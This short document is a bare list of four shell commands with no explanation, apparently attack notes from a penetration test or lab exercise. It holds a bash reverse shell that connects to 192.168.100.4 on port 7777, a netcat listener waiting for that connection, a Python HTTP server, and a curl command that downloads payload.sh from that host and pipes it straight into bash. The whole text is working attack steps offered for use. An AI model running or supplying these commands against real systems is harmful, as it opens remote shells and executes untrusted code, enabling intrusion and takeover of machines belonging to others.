/bin/bash -c 'exec bash -i >& /dev/tcp/192.168.100.4/7777 0>&1'

nc -nvlp 7777

python3 -m http.server 8001

curl http://192.168.100.4:8001/payload.sh | bash